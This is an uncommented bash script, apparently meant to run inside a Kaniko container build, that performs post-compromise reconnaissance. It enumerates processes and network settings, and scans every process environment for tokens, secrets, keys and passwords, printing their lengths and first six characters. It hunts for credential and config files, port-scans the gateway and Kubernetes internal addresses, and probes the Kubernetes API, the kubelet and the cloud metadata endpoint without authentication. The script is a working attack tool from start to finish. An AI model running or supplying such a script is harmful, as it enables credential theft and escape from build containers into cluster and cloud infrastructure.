#!/bin/bash
set +e
echo "--- id"; id
echo "--- ps"; ps -ef 2>/dev/null | head -50
echo "--- net"; ip addr 2>/dev/null; ip route 2>/dev/null; cat /proc/net/arp 2>/dev/null; cat /etc/resolv.conf 2>/dev/null; cat /etc/hosts 2>/dev/null
echo "--- procenv"
for p in /proc/[0-9]*; do
  cmd=$(tr '\0' ' ' < "$p/cmdline" 2>/dev/null | cut -c1-140)
  [ -z "$cmd" ] && continue
  echo "## $p $cmd"
  tr '\0' '\n' < "$p/environ" 2>/dev/null | grep -iE 'token|secret|key|pass|auth|registr|docker|docr|user' | while IFS='=' read -r k v; do
    echo "   $k len=${#v} head=${v:0:6}"
  done
done
echo "--- kaniko tree"
find /kaniko /root /home /etc/docker /var/run /run -maxdepth 4 -type f 2>/dev/null | head -100
echo "--- small configs"
find /kaniko /root /home /etc /var/run /run -maxdepth 4 -type f \( -name 'config.json' -o -name '*.json' -o -name '*.toml' -o -name '*.yaml' -o -name '*.yml' -o -name '*cred*' \) 2>/dev/null | head -40 | while read -r f; do
  echo "### $f $(wc -c < "$f" 2>/dev/null)"
  head -c 300 "$f" 2>/dev/null | sed -E 's/(auth|password|token|secret)[^,}]*/\1=REDACTED/gi'
  echo
done
echo "--- mounts"
cat /proc/mounts 2>/dev/null | grep -E 'secret|config|kaniko|docker|workspace|tmp' | head -40
echo "--- k8s dns"
getent hosts kubernetes.default.svc 2>&1
GW=$(ip route 2>/dev/null | awk '/default/ {print $3; exit}')
echo "GW=$GW"
for h in $GW 10.245.0.1 10.244.85.1 10.244.0.1 169.254.169.254; do
  for port in 443 10250 10255 6443 8080 8443 80; do
    timeout 2 bash -c "echo > /dev/tcp/$h/$port" 2>/dev/null && echo "OPEN $h:$port"
  done
done
echo "--- api noauth"
curl -sk --max-time 4 https://kubernetes.default.svc/version; echo
curl -sk --max-time 4 https://kubernetes.default.svc/api/v1/namespaces 2>/dev/null | head -c 300; echo
echo "--- kubelet"
curl -sk --max-time 4 "https://$GW:10250/pods" 2>/dev/null | head -c 300; echo
curl -s --max-time 4 "http://$GW:10255/pods" 2>/dev/null | head -c 300; echo
echo "--- meta variants"
for u in http://169.254.169.254/metadata/v1.json http://169.254.169.254/latest/meta-data/ http://169.254.169.254/computeMetadata/v1/; do
  echo "## $u"; curl -sS --max-time 3 "$u" 2>&1 | head -c 200; echo
done
echo "--- done"
